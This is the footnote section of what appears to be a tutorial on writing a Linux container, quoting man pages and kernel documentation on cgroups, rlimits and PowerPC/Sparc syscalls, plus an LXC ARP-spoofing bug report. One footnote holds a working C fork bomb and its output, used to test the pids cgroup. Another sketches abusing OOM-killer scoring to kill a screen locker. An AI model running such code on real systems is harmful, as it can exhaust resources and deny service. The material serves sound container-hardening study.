	spu_run - execute an SPU context

SYNOPSIS
	#include &lt;sys/spu.h&gt;

	int spu_run(int fd, unsigned int *npc, unsigned int *event);

	Note: There  is no glibc  wrapper for this system  call; see
	NOTES.

DESCRIPTION
	The spu_run() system  call is used on  PowerPC machines that
	implement the Cell Broadband Engine Architecture in order to
	access Synergistic Processor Units  (SPUs).  The fd argument
	is a  file descriptor returned by  spu_create(2) that refers
	to a specific SPU context.   When the context gets scheduled
	to a  physical SPU, it  starts execution at  the instruction
	pointer passed in npc.

</pre>
</div></div></div>

<div class="footdef"><sup><a id="fn.80" class="footnum" href="#fnr.80">80</a></sup> <div class="footpara"><div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 151: </span><a href="http://man7.org/linux/man-pages/man2/subpage_prot.2.html"><code>man 2 subpage_prot</code></a></label><pre class="src src-text">SUBPAGE_PROT(2) -- 2012-07-13 -- Linux -- Linux Programmer's Manual

NAME
	subpage_prot -  define a  subpage protection for  an address
	range

	[...]

VERSIONS
	This  system call  is provided  on the  PowerPC architecture
	since Linux 2.6.25.  The system call is provided only if the
	kernel is configured  with CONFIG_PPC_64K_PAGES.  No library
	support is provided.

</pre>
</div></div></div>

<div class="footdef"><sup><a id="fn.81" class="footnum" href="#fnr.81">81</a></sup> <div class="footpara"><div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 149: </span><a href="http://man7.org/linux/man-pages/man2/syscalls.2.html"><code>man 2 syscalls</code></a></label><pre class="src src-text">	utrap_install(2)	2.2	Sparc only
</pre>
</div></div></div>

<div class="footdef"><sup><a id="fn.82" class="footnum" href="#fnr.82">82</a></sup> <div class="footpara"><div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 144: </span><a href="http://man7.org/linux/man-pages/man2/syscalls.2.html"><code>man 2 syscalls</code></a></label><pre class="src src-text">	kern_features(2)	3.7	Sparc64
</pre>
</div>

<p class="footpara">
This is pretty vague, so I looked at the source. It's only mentioned
in an Sparc64-specific file:
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 145: </span><a href="https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/tree/arch/sparc/kernel/sys_sparc_64.c?id=c8d2bc9bc39ebea8437fd974fdbc21847bb897a3#n648"><code>arch/sparc/kernel/sys_sparc_64.c:648@c8d2bc</code></a></label><pre class="src src-C">asmlinkage long sys_kern_features(void)
{
	return KERN_FEATURE_MIXED_MODE_STACK;
}
</pre>
</div></div></div>

<div class="footdef"><sup><a id="fn.83" class="footnum" href="#fnr.83">83</a></sup> <div class="footpara"><div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 155: </span><a href="http://man7.org/linux/man-pages/man2/preadv2.2.html"><code>man 2 preadv2</code></a></label><pre class="src src-text">DESCRIPTION
	The readv() system  call reads iovcnt buffers  from the file
	associated  with the  file  descriptor fd  into the  buffers
	described by iov ("scatter input").

	The  writev()  system call  writes  iovcnt  buffers of  data
	described  by  iov to  the  file  associated with  the  file
	descriptor fd ("gather output").

	[...]

	The readv() system call works  just like read(2) except that
	multiple buffers are filled.

	The  writev() system  call works  just like  write(2) except
	that multiple buffers are written out.

	[...]

   preadv() and pwritev()
	The  preadv()  system  call combines  the  functionality  of
	readv() and pread(2).  It performs the same task as readv(),
	but adds a fourth argument, offset, which specifies the file
	offset at which the input operation is to be performed.

	The  pwritev() system  call  combines  the functionality  of
	writev()  and  pwrite(2).   It  performs the  same  task  as
	writev(),  but   adds  a  fourth  argument,   offset,  which
	specifies the file  offset at which the  output operation is
	to be performed.

	The file offset  is not changed by these  system calls.  The
	file referred to by fd must be capable of seeking.

   preadv2() and pwritev2()

	These  system calls  are similar  to preadv()  and pwritev()
	calls, but add  a fifth argument, flags,  which modifies the
	behavior on a per-call basis.

	Unlike preadv() and pwritev(), if the offset argument is -1,
	then the current file offset is used and updated.

	The flags argument contains a bitwise  OR of zero or more of
	the following flags:

	RWF_DSYNC (since Linux 4.7)
		Provide a  per-write equivalent of the  O_DSYNC open(2)
		flag.  This flag is meaningful only for pwritev2(), and
		its effect  applies only to  the data range  written by
		the system call.

	RWF_HIPRI (since Linux 4.6)
		High    priority   read/write.     Allows   block-based
		filesystems  to  use  polling   of  the  device,  which
		provides   lower  latency,   but  may   use  additional
		resources.  (Currently, this feature  is usable only on
		a file descriptor opened using the O_DIRECT flag.)

	RWF_SYNC (since Linux 4.7)
		Provide a  per-write equivalent  of the  O_SYNC open(2)
		flag.  This flag is meaningful only for pwritev2(), and
		its effect  applies only to  the data range  written by
		the system call.
</pre>
</div></div></div>

<div class="footdef"><sup><a id="fn.84" class="footnum" href="#fnr.84">84</a></sup> <div class="footpara"><p class="footpara">
This isn't just a denial-of-service concern. If a process consumes a
lot of memory, and has a better <code>badness</code> score than some other
critical host-side process, the host-side process will be killed by
the kernel's out-of-memory killer.
</p>

<p class="footpara">
The badness score favors longer-running processes, among other things:
</p>

<p class="footpara">
<a href="https://lwn.net/Articles/317814/">"Taming the OOM Killer"</a> on LWN:
</p>
<blockquote>
<p>
The process to be killed in an out-of-memory situation is selected
based on its badness score. The badness score is reflected in
/proc/&lt;pid&gt;/oom_score. This value is determined on the basis that
the system loses the minimum amount of work done, recovers a large
amount of memory, doesn't kill any innocent process eating tons of
memory, and kills the minimum number of processes (if possible
limited to one). The badness score is computed using the original
memory size of the process, its CPU time (utime + stime), the run
time (uptime - start time) and its oom_adj value. The more memory
the process uses, the higher the score. The longer a process is
alive in the system, the smaller the score.
</p>
</blockquote>

<p class="footpara">
I haven't demonstrated it, but I believe this could manipulated to
cause a screen lock program to be killed, for example. It's not
unheard of for e.g. xscreensaver to leak memory:
</p>

<p class="footpara">
<a href="https://bugs.launchpad.net/ubuntu/+source/xscreensaver/+bug/768032">"gltext seems to leak memory eventually causing oom-killer to run"</a>:
</p>
<blockquote>
<p>
gltext is consuming large amounts of memory. Often being killed by
oom-killer but eventually causing me not to be able to log into my
computer disabling gltext from the list of possible screensavers
caused the problem to go away.
</p>
</blockquote>

<p class="footpara">
There's even an open Ubuntu xscreensaver bug to make the OOM killer
<b>more likely</b> to kill xscreensaver. This seems like the wrong
direction to me&#x2026;.
</p>

<p class="footpara">
<a href="https://bugs.launchpad.net/ubuntu/+source/xscreensaver/+bug/807685">"xscreensaver does not protect the system against its children"</a>:
</p>
<blockquote>
<p>
The thing is, a screensaver is <b>NOT</b> a critically important part of
the system. It should die early if it is a resource hog. All you have
to do is write "10" into /proc/PID/oom_adj and Bob's your uncle. Until
then, Xscreensaver is failing its duties.
</p>
</blockquote></div></div>

<div class="footdef"><sup><a id="fn.85" class="footnum" href="#fnr.85">85</a></sup> <div class="footpara"><div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 174: </span><a href="http://man7.org/linux/man-pages/man7/cgroup_namespaces.7.html"><code>man 7 cgroup_namespaces</code></a></label><pre class="src src-text">	Cgroup namespaces virtualize the view of a process's cgroups
	(see   cgroups(7))  as   seen  via   /proc/[pid]/cgroup  and
	/proc/[pid]/mountinfo.

	Each  cgroup  namespace  has  its own  set  of  cgroup  root
	directories,  which are  the  base points  for the  relative
	locations displayed  in /proc/[pid]/cgroup.  When  a process
	creates a new cgroup  namespace using clone(2) or unshare(2)
	with  the  CLONE_NEWCGROUP  flag,  it enters  a  new  cgroup
	namespace in  which its  current cgroups  directories become
	the  cgroup root  directories of  the new  namespace.  (This
	applies both for  the cgroups version 1  hierarchies and the
	cgroups version 2 unified hierarchy.)
</pre>
</div></div></div>

<div class="footdef"><sup><a id="fn.86" class="footnum" href="#fnr.86">86</a></sup> <div class="footpara"><div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 175: </span><a href="https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/tree/Documentation/cgroup-v1/memory.txt?id=c8d2bc9bc39ebea8437fd974fdbc21847bb897a3"><code>Documentation/cgroup-v1/memory.txt@c8d2bc</code></a></label><pre class="src src-text">Brief summary of control files.
[...]
 memory.limit_in_bytes		 # set/show limit of memory usage
</pre>
</div></div></div>

<div class="footdef"><sup><a id="fn.87" class="footnum" href="#fnr.87">87</a></sup> <div class="footpara"><div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 176: </span><a href="https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/tree/Documentation/cgroup-v1/memory.txt?id=c8d2bc9bc39ebea8437fd974fdbc21847bb897a3"><code>Documentation/cgroup-v1/memory.txt@c8d2bc</code></a></label><pre class="src src-text">Brief summary of control files.
[...]
 memory.kmem.limit_in_bytes      # set/show hard limit for kernel memory
</pre>
</div></div></div>

<div class="footdef"><sup><a id="fn.88" class="footnum" href="#fnr.88">88</a></sup> <div class="footpara"><div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 179: </span><a href="http://man7.org/linux/man-pages/man7/cgroups.7.html"><code>man 7 cgroups</code></a></label><pre class="src src-text">   Cgroups version 1 controllers
	Each of the  cgroups version 1 controllers is  governed by a
	kernel configuration  option (listed  below).  Additionally,
	the availability of  the cgroups feature is  governed by the
	CONFIG_CGROUPS kernel configuration option.

	cpu (since Linux 2.6.24; CONFIG_CGROUP_SCHED)
		Cgroups  can be  guaranteed  a minimum  number of  "CPU
		shares" when a  system is busy.  This does  not limit a
		cgroup's CPU usage if the CPUs are not busy.

		Further information  can be found in  the kernel source
		file Documentation/scheduler/sched-bwc.txt.

</pre>
</div></div></div>

<div class="footdef"><sup><a id="fn.89" class="footnum" href="#fnr.89">89</a></sup> <div class="footpara"><div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 177: </span><a href="https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/tree/Documentation/cgroup-v1/pids.txt?id=c8d2bc9bc39ebea8437fd974fdbc21847bb897a3"><code>Documentation/cgroup-v1/pids.txt@c8d2bc</code></a></label><pre class="src src-text">						   Process Number Controller
						   =========================

Abstract
--------

The process number controller is used to allow a cgroup hierarchy to stop any
new tasks from being fork()'d or clone()'d after a certain limit is reached.

Since it is trivial to hit the task limit without hitting any kmemcg limits in
place, PIDs are a fundamental resource. As such, PID exhaustion must be
preventable in the scope of a cgroup hierarchy by allowing resource limiting of
the number of tasks in a cgroup.

Usage
-----

In order to use the `pids` controller, set the maximum number of tasks in
pids.max (this is not available in the root cgroup for obvious reasons). The
number of processes currently in the cgroup is given by pids.current.

</pre>
</div>

<p class="footpara">
for example,
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 178: </span><code>forkbomb.c</code></label><pre class="src src-C">/* -*- compile-command: "gcc -Wall -Werror -static forkbomb.c -o forkbomb" -*- */
#include &lt;stdio.h&gt;
#include &lt;unistd.h&gt;
#include &lt;errno.h&gt;

int main (int argc, char  **argv)
{
	switch (fork()) {
	case -1:
		fprintf(stderr, "++ couldn't even fork once: %m\n");
		return 1;
	case 0:
		while (1) {
			switch (fork()) {
			case -1:
				break;
			case 0:
				fprintf(stderr, "++ successful fork.\n");
				break;
			default:
				break;
				
			}
		}
		break;
	default:
		while (1) sleep(1);
		break;
	}
	return 0;
}
</pre>
</div>

<pre class="example">
[lizzie@empress l-c-i-500-l]$ sudo ./contained -m . -u 0 -c forkbomb
=&gt; validating Linux version...4.7.10.201610222037-1-grsec on x86_64.
=&gt; setting cgroups...memory...cpu...pids...blkio...done.
=&gt; setting rlimit...done.
=&gt; remounting everything with MS_PRIVATE...remounted.
=&gt; making a temp directory and a bind mount there...done.
=&gt; pivoting root...done.
=&gt; unmounting /oldroot.0sOZgF...done.
=&gt; trying a user namespace...writing /proc/2184/uid_map...writing /proc/2184/gid_map...done.
=&gt; switching to uid 0 / gid 0...done.
=&gt; dropping capabilities...bounding...inheritable...done.
=&gt; filtering syscalls...done.
++ successful fork.
++ successful fork.
++ successful fork.
++ successful fork.
++ successful fork.
++ successful fork.
++ successful fork.
++ successful fork.
++ successful fork.
++ successful fork.
++ successful fork.
++ successful fork.
++ successful fork.
++ successful fork.
++ successful fork.
++ successful fork.
++ successful fork.
++ successful fork.
++ successful fork.
++ successful fork.
++ successful fork.
++ successful fork.
++ successful fork.
++ successful fork.
++ successful fork.
++ successful fork.
++ successful fork.
++ successful fork.
++ successful fork.
++ successful fork.
++ successful fork.
++ successful fork.
++ successful fork.
++ successful fork.
++ successful fork.
++ successful fork.
++ successful fork.
++ successful fork.
++ successful fork.
++ successful fork.
++ successful fork.
++ successful fork.
++ successful fork.
++ successful fork.
++ successful fork.
++ successful fork.
++ successful fork.
++ successful fork.
++ successful fork.
++ successful fork.
++ successful fork.
++ successful fork.
++ successful fork.
++ successful fork.
++ successful fork.
++ successful fork.
++ successful fork.
++ successful fork.
++ successful fork.
++ successful fork.
++ successful fork.
C-c C-c
</pre></div></div>

<div class="footdef"><sup><a id="fn.90" class="footnum" href="#fnr.90">90</a></sup> <div class="footpara"><div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 180: </span><a href="https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/tree/Documentation/cgroup-v1/blkio-controller.txt?id=c8d2bc9bc39ebea8437fd974fdbc21847bb897a3"><code>Documentation/cgroup-v1/blkio-controller.txt@c8d2bc</code></a></label><pre class="src src-text">Details of cgroup files
=======================
Proportional weight policy files
--------------------------------
- blkio.weight
	- Specifies per cgroup weight. This is default weight of the group
	  on all the devices until and unless overridden by per device rule.
	  (See blkio.weight_device).
	  Currently allowed range of weights is from 10 to 1000.

</pre>
</div></div></div>

<div class="footdef"><sup><a id="fn.91" class="footnum" href="#fnr.91">91</a></sup> <div class="footpara"><div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 182: </span><a href="http://man7.org/linux/man-pages/man7/cgroups.7.html"><code>man 7 cgroups</code></a></label><pre class="src src-text">   Creating cgroups and moving processes
	A cgroup filesystem initially contains a single root cgroup,
	'/', which all processes belong to.  A new cgroup is created
	by creating a directory in the cgroup filesystem:

	    mkdir /sys/fs/cgroup/cpu/cg1

	This creates a new empty cgroup.

	A process  may be moved  to this  cgroup by writing  its PID
	into the cgroup's cgroup.procs file:

	    echo $$ &gt; /sys/fs/cgroup/cpu/cg1/cgroup.procs

	Only one PID at a time should be written to this file.

	Writing  the  value 0  to  a  cgroup.procs file  causes  the
	writing process to be moved to the corresponding cgroup.

	When writing a PID into the cgroup.procs, all threads in the
	process are moved into the new cgroup at once.

	Within a hierarchy, a process can be a member of exactly one
	cgroup.   Writing a  process's  PID to  a cgroup.procs  file
	automatically removes  it from  the cgroup  of which  it was
	previously a member.

	The cgroup.procs  file can be read  to obtain a list  of the
	processes that are  members of a cgroup.   The returned list
	of  PIDs is  not  guaranteed  to be  in  order.   Nor is  it
	guaranteed to  be free of  duplicates.  (For example,  a PID
	may be recycled while reading from the list.)

	In cgroups v1 (but not cgroups v2), an individual thread can
	be moved to  another cgroup by writing its  thread ID (i.e.,
	the kernel thread ID returned  by clone(2) and gettid(2)) to
	the tasks file in a cgroup directory.  This file can be read
	to  discover the  set of  threads  that are  members of  the
	cgroup.  This file is not present in cgroup v2 directories.
</pre>
</div></div></div>

<div class="footdef"><sup><a id="fn.92" class="footnum" href="#fnr.92">92</a></sup> <div class="footpara"><div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 184: </span><a href="http://man7.org/linux/man-pages/man2/setrlimit.2.html"><code>man 2 setrlimit</code></a></label><pre class="src src-text">	The soft limit is the value that the kernel enforces for the
	corresponding resource.   The hard  limit acts as  a ceiling
	for the soft limit: an unprivileged process may set only its
	soft limit  to a value  in the range from  0 up to  the hard
	limit,  and   (irreversibly)  lower   its  hard   limit.   A
	privileged    process   (under    Linux:   one    with   the
	CAP_SYS_RESOURCE capability)  may make arbitrary  changes to
	either limit value.
</pre>
</div></div></div>

<div class="footdef"><sup><a id="fn.93" class="footnum" href="#fnr.93">93</a></sup> <div class="footpara"><div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 186: </span><a href="https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/tree/Documentation/cgroup-v1/cgroups.txt?id=c8d2bc9bc39ebea8437fd974fdbc21847bb897a3"><code>Documentation/cgroup-v1/cgroups.txt@c8d2bc</code></a></label><pre class="src src-text">1.4 What does notify_on_release do ?
------------------------------------

If the notify_on_release flag is enabled (1) in a cgroup, then
whenever the last task in the cgroup leaves (exits or attaches to
some other cgroup) and the last child cgroup of that cgroup
is removed, then the kernel runs the command specified by the contents
of the "release_agent" file in that hierarchy's root directory,
supplying the pathname (relative to the mount point of the cgroup
file system) of the abandoned cgroup.  This enables automatic
removal of abandoned cgroups.  The default value of
notify_on_release in the root cgroup at system boot is disabled
(0).  The default value of other cgroups at creation is the current
value of their parents' notify_on_release settings. The default value of
a cgroup hierarchy's release_agent path is empty.
</pre>
</div>

<p class="footpara">
It's annoying to set the release agent on a per-container basis, so
we'll avoid it.
</p></div></div>

<div class="footdef"><sup><a id="fn.94" class="footnum" href="#fnr.94">94</a></sup> <div class="footpara"><div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 188: </span><a href="https://bugs.launchpad.net/ubuntu/+source/lxc/+bug/1548497">"Cross-Container ARP Poisoning"</a>, an LXC bug report by Jesse Hertz of NCCGroup</label><pre class="src src-text">Description:

An unprivileged LXC container can conduct an ARP spoofing attack
against another unprivileged LXC container running on the same
host. This allows man-in-the-middle attacks on another container's
traffic.

Recommendation:

Due to the complex nature of this involving the Linux bridge
interface, NCC is not aware of an easy fix. We suggest involving the
kernel networking team to allow for ARP restrictions on virtual bridge
interfaces. Using ebtables to block and control link layer traffic may
also be an effective fix. Documentation should reflect the risks of
not using any future protections or ebtables.

StÃ©phane Graber (stgraber) wrote on 2016-02-22:	#1
Hi,

Thanks for the report. This is not exactly news to us and has been
mentioned publicly a few times.

Our usual answer to this is that if you don't trust your users, you
shouldn't grant them access to a shared bridge, instead setup a
separate bridge for them.

MAC filtering through ebtables is an option but the problem with this
approach is that it essentially prevents container nesting as that
would lead to more than one MAC being used by the container which
ebtables would block.

[...]

On a local system, our answer to that is as I said to either trust
everyone you give access to a shared bridge or to segment traffic by
using multiple bridges.
</pre>
</div></div></div>

<div class="footdef"><sup><a id="fn.95" class="footnum" href="#fnr.95">95</a></sup> <div class="footpara"><div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 189: </span><a href="http://man7.org/linux/man-pages/man7/cgroups.7.html"><code>man 7 cgroups</code></a></label><pre class="src src-text">   Cgroups version 1 controllers
	Each of the  cgroups version 1 controllers is  governed by a
	kernel configuration  option (listed  below).  Additionally,
	the availability of  the cgroups feature is  governed by the
	CONFIG_CGROUPS kernel configuration option.
[...]

	net_prio (since Linux 3.3; CONFIG_CGROUP_NET_PRIO)
		This  allows priorities  to be  specified, per  network
		interface, for cgroups.

		Further information  can be found in  the kernel source
		file Documentation/cgroup-v1/net_prio.txt.

</pre>
</div></div></div>


</div>
</div></div>
</body>
</html>
